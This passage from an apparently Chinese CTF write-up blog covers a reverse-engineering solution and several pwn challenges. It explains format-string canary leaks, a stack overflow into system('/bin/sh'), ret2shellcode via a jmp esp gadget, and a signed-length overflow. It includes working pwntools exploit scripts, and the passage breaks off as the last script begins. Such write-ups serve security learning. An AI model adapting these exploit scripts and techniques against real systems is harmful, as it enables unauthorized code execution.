class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::<span class="built_in">vector</span>((__int64)&amp;v13);</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::<span class="built_in">vector</span>((__int64)&amp;v14);</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::<span class="built_in">vector</span>((__int64)&amp;v15);</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::<span class="built_in">vector</span>((__int64)&amp;v16);</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::<span class="built_in">vector</span>((__int64)&amp;v17);</span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;v20[<span class="number">4</span> * i], v10);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::push_back((__int64)&amp;v14, (__int64)&amp;v20[<span class="number">4</span> * i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">15</span>; ++j )</span><br><span class="line">&#123;</span><br><span class="line">  LODWORD(v19) = fib(j);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::push_back(&amp;v13, &amp;v19);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::push_back((__int64)&amp;v15, (__int64)v20);</span><br><span class="line">v3 = <span class="built_in">std</span>::back_inserter&lt;<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;((__int64)&amp;v15);</span><br><span class="line">v4 = <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::end((__int64)&amp;v14);</span><br><span class="line">v19 = <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::begin(&amp;v14);</span><br><span class="line">v5 = __gnu_cxx::__normal_iterator&lt;<span class="keyword">int</span> *,<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;::<span class="keyword">operator</span>+(&amp;v19, <span class="number">1L</span>L);</span><br><span class="line"><span class="built_in">std</span>::transform&lt;__gnu_cxx::__normal_iterator&lt;<span class="keyword">int</span> *,<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;,<span class="built_in">std</span>::back_insert_iterator&lt;<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;,main::&#123;lambda(<span class="keyword">int</span>)#<span class="number">1</span>&#125;&gt;(</span><br><span class="line">  v5,</span><br><span class="line">  v4,</span><br><span class="line">  v3,</span><br><span class="line">  (__int64)v20);</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::<span class="built_in">vector</span>((__int64)&amp;v18);</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::end((__int64)&amp;v15);</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::begin(&amp;v15);</span><br><span class="line"><span class="built_in">std</span>::accumulate&lt;__gnu_cxx::__normal_iterator&lt;<span class="keyword">int</span> *,<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;,<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;,main::&#123;lambda(<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;,<span class="keyword">int</span>)#<span class="number">2</span>&#125;&gt;((<span class="keyword">unsigned</span> __int64)&amp;v19);</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::<span class="keyword">operator</span>=(&amp;v16, &amp;v19);</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::~<span class="built_in">vector</span>(&amp;v19);</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::~<span class="built_in">vector</span>(&amp;v18);</span><br><span class="line"><span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)<span class="built_in">std</span>::<span class="keyword">operator</span>!=&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;((__int64)&amp;v16, (__int64)&amp;v13) )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"You failed!"</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">std</span>::back_inserter&lt;<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;((__int64)&amp;v17);</span><br><span class="line">v6 = <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::end((__int64)&amp;v14);</span><br><span class="line">v7 = <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::begin(&amp;v14);</span><br><span class="line"><span class="built_in">std</span>::copy_if&lt;__gnu_cxx::__normal_iterator&lt;<span class="keyword">int</span> *,<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;,<span class="built_in">std</span>::back_insert_iterator&lt;<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;,main::&#123;lambda(<span class="keyword">int</span>)#<span class="number">3</span>&#125;&gt;(v7);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"You win!"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Your flag is:flag&#123;"</span>, v6, v10);</span><br></pre></td></tr></table></figure><p>整个流程大概就是先创建几个空的vector容器，然后一个容器存放输入的16个数字，然后一个容器存放斐波那契数列，用transform将除了第一个元素外的每一个元素加上第一个元素的值，然后都赋值给一个新的vector容器，之后用accumulate将函数倒序赋值给V19（这一步我看不懂，accumulate是用来计算累加值的，但是这里只用了v19一个参数就实现了倒序，这里纯粹看堆内数据才看出来是倒序），然后让v16=v19，最后比较V16和V13，v13就是斐波那契数列，如果相等就通过，不相等就不通过。<br>精简后的过程就是：输入16个数字，后面十五个数字都加上第一个数字，然后整个数列颠倒，最后和斐波那契数列比较。<br>由此构造需要输入的数组：<br>987<br>-377<br>-610<br>-754<br>-843<br>-898<br>-932<br>-953<br>-966<br>-974<br>-979<br>-982<br>-984<br>-985<br>-986<br>-986<br>就是颠倒的斐波那契数列，除第一个元素外，其它元素都要减去第一个元素。最后得到Your flag is:flag{987-377-843-953-979-985}</p><h2 id="2019西湖论剑杯-pwn-store"><a href="#2019西湖论剑杯-pwn-store" class="headerlink" title="2019西湖论剑杯-pwn-store"></a>2019西湖论剑杯-pwn-store</h2><p>基本格式化任意地址泄露和基本rop</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *ptr; <span class="comment">// ST18_8</span></span><br><span class="line">  <span class="keyword">char</span> *v4; <span class="comment">// ST20_8</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L);</span><br><span class="line">  ptr = sub_400915();</span><br><span class="line">  v4 = sub_4009A0();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Thank you for you share!!"</span>);</span><br><span class="line">  <span class="built_in">free</span>(ptr);</span><br><span class="line">  <span class="built_in">free</span>(v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这是main函数，一开始被两个没有置NULL的free迷惑，以为是use after free，赛后经别人提醒才发现是格式化漏洞，当初没好好学，记成了printf里变量没有&amp;才是格式化漏洞，实际只要printf里只有变量就存在格式化漏洞，格式化漏洞的大致原理就是直接printf(&amp;s)的情况下，printf首先会检测变量内是否存在%，如果有就向后检测需要输出哪种类型的变量，比如人为构造s=”%s”，那么printf检测到%s，就会从栈内输出一个字符串类型的变量，相当于printf(“%s”,stack[0])，如果是%x或者%p就能泄露32位和64位系统的栈内值，%n$x中的n$代表偏移n个变量，由此可以实现栈内任意地址泄露。（但是0$的位置我一直没摸清楚，只能通过多泄露几个值对比栈内值得到偏移，但x32系统下一般是调用printf函数时栈内第2个位置）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">sub_400915</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v0; <span class="comment">// ST08_8</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+10h] [rbp-40h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Please Tell Your ID:"</span>);</span><br><span class="line">  sub_400ABE((__int64)&amp;s, <span class="number">0x32</span>uLL);</span><br><span class="line">  v0 = strdup(&amp;s);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Hello "</span>, <span class="number">50L</span>L);</span><br><span class="line">  <span class="built_in">printf</span>(&amp;s);<span class="comment">//格式化漏洞</span></span><br><span class="line">  <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">  <span class="keyword">return</span> v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为这一题开了canary，所以需要泄露canary的值，然后在栈溢出的时候用已知的canary值覆盖就能绕过检测了，同一个进程内栈的canary都是相同的。<br>这里我先通过输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%0$p%1$p%2$p%3$p%4$p%5$p%6$p%7$p%8$p%9$p%10$p</span><br></pre></td></tr></table></figure><p>确认printf参数在栈内的起始位置<br><img src="/images/2019-4-17/2019-4-17-2025.png" alt="avatar"><br><img src="/images/2019-4-17/2019-4-17-2026.png" alt="avatar"><br>可以看到<code>%7$p</code>对应的是0x7fffffffe078的0x603260<br>相应的<code>%15$p</code>和<code>%23$p</code>就是canary的值，<code>%25$p</code>就是start+231的地址。<br>知道了canary的值和start+231的址，在之后的栈溢出中就是构造payload了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">sub_4009A0</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// [rsp+0h] [rbp-A0h]</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+10h] [rbp-90h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+98h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Tell me the size of your story:"</span>);</span><br><span class="line">  v1 = sub_400A54();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> )</span><br><span class="line">    v1 = -v1;</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt; <span class="number">128</span> )</span><br><span class="line">    v1 = <span class="number">1024L</span>L;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"You can speak your story:"</span>);</span><br><span class="line">  sub_400ABE((__int64)&amp;s, v1);</span><br><span class="line">  <span class="keyword">return</span> strdup(&amp;s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到s离rbp只有0x90，而v1是可以等于任意大小的，非常简单的栈溢出，我决定返回system，在失败了几次后我才想起来这是x64系统，函数的参数传递不再是用栈，而是用寄存器。</p><p>X64参数传递：<br>当参数少于7个时,参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9。<br>当参数为7个以上时， 前 6 个与前面一样， 但后面的依次从 “右向左” 放入栈中，即和32位汇编一样。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">mov     edi, offset aYouCanSpeakYou ; <span class="string">"You can speak your story:"</span></span><br><span class="line">call    <span class="built_in">puts</span></span><br><span class="line">mov     rdx, [rbp+var_A0]</span><br><span class="line">lea     rax, [rbp+s]</span><br><span class="line">mov     rsi, rdx</span><br><span class="line">mov     rdi, rax</span><br><span class="line">call    sub_400ABE</span><br><span class="line">lea     rax, [rbp+s]</span><br><span class="line">mov     rdi, rax        ; s</span><br><span class="line">call    strdup</span><br><span class="line">mov     [rbp+var_98], rax</span><br><span class="line">mov     rax, [rbp+var_98]</span><br><span class="line">mov     rcx, [rbp+var_8]</span><br><span class="line">xor     rcx, fs:<span class="number">28</span>h</span><br><span class="line">jz      <span class="keyword">short</span> locret_400A52</span><br><span class="line">call    __stack_chk_fail</span><br></pre></td></tr></table></figure><p>通过阅读结尾的汇编，发现最后会把字符串s存进rax，然后mov rdi,rax。所以我们在输入s时需要先输入”/bin/sh\x00”<br>最后脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">s=process(<span class="string">'./story'</span>)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">s.sendlineafter(<span class="string">"ID:"</span>,<span class="string">"%15$p%25$p"</span>)</span><br><span class="line">a=s.recvuntil(<span class="string">"0x"</span>)</span><br><span class="line">b=s.recvuntil(<span class="string">"0x"</span>)</span><br><span class="line">c=s.recvuntil(<span class="string">"b17"</span>)<span class="comment">#因为程序引用的libc不变的话，低12位是不会变的，也就是start+231的结尾12个bit是固定的，在我的kali系统是固定b17，也可以根据这一点在https://libc.blukat.me/查看相应libc的版本</span></span><br><span class="line">gdb.attach(s)</span><br><span class="line">carry=int(b[<span class="number">0</span>:<span class="number">-2</span>],<span class="number">16</span>)</span><br><span class="line">start_addr=int(c,<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">print(libc.symbols[<span class="string">'__libc_start_main'</span>])</span><br><span class="line">base_addr=start_addr<span class="number">-231</span>-libc.symbols[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">system_addr=base_addr+libc.symbols[<span class="string">'__libc_system'</span>]</span><br><span class="line">bin_addr=base_addr+<span class="number">0x17f573</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">"/bin/sh\x00"</span>+<span class="string">'\x00'</span>*<span class="number">8</span>+<span class="string">'a'</span>*<span class="number">0x78</span>+p64(carry)+<span class="string">'a'</span>*<span class="number">8</span>+p64(system_addr)</span><br><span class="line"></span><br><span class="line">s.sendlineafter(<span class="string">"Tell me the size of your story:"</span>,<span class="string">"-10000"</span>)</span><br><span class="line">s.sendlineafter(<span class="string">"You can speak your story:"</span>,payload)</span><br><span class="line">s.interactive()</span><br></pre></td></tr></table></figure><h2 id="2019嘉韦思杯final-pwn-Bin"><a href="#2019嘉韦思杯final-pwn-Bin" class="headerlink" title="2019嘉韦思杯final-pwn-Bin"></a>2019嘉韦思杯final-pwn-Bin</h2><p>两题pwn只做出来了这一题基本的ret2shellcode，第二题的tcache之前没学过，这次比赛也让我意识到自己总是在重复做一些基本的堆栈溢出，能力已经很久没有提升了，而且密码学自己学了des后就停滞了，这次遇到了简单的AES却没能做出来，决定开始少参加比赛，多潜心学习，而不是继续浪费时间在那些简单题目上了。</p><p>这题唯一的难点在要注意到hint</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+1Ch] [ebp-64h]</span></span><br><span class="line"></span><br><span class="line">  init();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"**************************************"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"welcome to exploit train"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"**************************************"</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x200</span>u);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"see you~~"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序很简单，溢出buf就好了，而且什么保护都没开，直接shellcode就行了，但是因为不知道栈内地址，所以没办法返回shell code的起始地址，然后看到了之前忽略的放在main函数之前的hint函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.text:080484ED hint            proc near</span><br><span class="line">.text:080484ED ; __unwind &#123;</span><br><span class="line">.text:080484ED                 push    ebp</span><br><span class="line">.text:080484EE                 mov     ebp, esp</span><br><span class="line">.text:080484F0                 jmp     esp</span><br><span class="line">.text:080484F0 hint            endp</span><br><span class="line">.text:080484F0</span><br></pre></td></tr></table></figure><p>然后就明白了，利用这个函数，就可以让程序返回到栈顶（esp）<br>构造脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh=remote(<span class="string">'172.20.3.35'</span>,<span class="number">9999</span>)</span><br><span class="line"><span class="comment">#sh = process('./Bin')</span></span><br><span class="line">shellcode = asm(shellcraft.i386.linux.sh())</span><br><span class="line"><span class="comment">#buf2_addr = 0x0804853b</span></span><br><span class="line">hin_addr=<span class="number">0x080484ed</span></span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">sh.sendline(<span class="string">"a"</span>*<span class="number">108</span>+shellcode[<span class="number">0</span>:<span class="number">4</span>] + p32(hin_addr)+shellcode[<span class="number">4</span>:])</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="DDCTF-pwn-xpwn"><a href="#DDCTF-pwn-xpwn" class="headerlink" title="DDCTF-pwn-xpwn"></a>DDCTF-pwn-xpwn</h2><p>保护就开了NX栈不可执行，那就用ret2syscall<br>这题唯一比较有意思的是ret前的汇编跟别的题目稍微有点不同</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.text:0804873A                 lea     esp, [ebp-8]</span><br><span class="line">.text:0804873D                 pop     ecx</span><br><span class="line">.text:0804873E                 pop     ebx</span><br><span class="line">.text:0804873F                 pop     ebp</span><br><span class="line">.text:08048740                 lea     esp, [ecx-4]</span><br><span class="line">.text:08048743                 retn</span><br></pre></td></tr></table></figure><p>这是main函数的结尾，可以看到先是esp=[ebp-8],接着pop ecx，然后esp=[ecx-4]，也相当于ret前栈顶的值变成了[[ebp-8]-4]的值，所以我们要在ebp-0x8的位置填上ropchain_addr+4，这样栈顶会变成ropchain_addr+4的地址，然后被pop给ecx，最后再esp=[ecx-4]=[ropchain_addr+4-4]=[ropchain_addr]，而地址ropchain_addr内就存放着exa_popret_addr的地址值，成功执行rop链。<br>解决了返回值的问题，还有一点就是如何泄露栈内的值</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+0h] [ebp-4Ch]</span></span><br><span class="line">  <span class="keyword">size_t</span> nbytes; <span class="comment">// [esp+40h] [ebp-Ch]</span></span><br><span class="line">  <span class="keyword">int</span> *v5; <span class="comment">// [esp+44h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = &amp;a1;</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">  sub_80485DB(<span class="built_in">stdin</span>, <span class="built_in">stdout</span>);<span class="comment">//存在read栈泄露</span></span><br><span class="line">  sleep(<span class="number">1u</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Please set the length of password: "</span>);</span><br><span class="line">  nbytes = sub_804862D();</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)nbytes &gt; <span class="number">63</span> )<span class="comment">//因为这里进行判断时nbyte是int型，而read读取时却是把它当作无符号的size_t，所以可以取负值造成栈溢出</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Too long!"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Enter password(lenth %u): "</span>, nbytes);</span><br><span class="line">  v1 = fileno(<span class="built_in">stdin</span>);</span><br><span class="line">  read(v1, &amp;buf, nbytes);<span class="comment">//存在栈溢出</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"All done, bye!"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看题目，存在栈溢出，sub_80485DB内可以泄露栈内值</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">sub_80485DB</span><span class="params">(FILE *stream, FILE *a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+0h] [ebp-48h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Enter username: "</span>);</span><br><span class="line">  v2 = fileno(stream);</span><br><span class="line">  read(v2, &amp;buf, <span class="number">0x40</span>u);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">fprintf</span>(a2, <span class="string">"Hello %s"</span>, &amp;buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的read不会在字符串末尾自动加上\x00，所以fprintf输出buf时会把栈内值都一起读出来，遇到\x00才终止，经过几次调试，会发现40个字符后会泄露ebp和setbuf+21的地址值，这样一来就获得了栈地址，也能通过setbuf+21的地址值计算出libc的基址了<br><img src="/images/2019-4-17/2019-4-17-2153.png" alt="avatar"></p><p>最后构造脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span 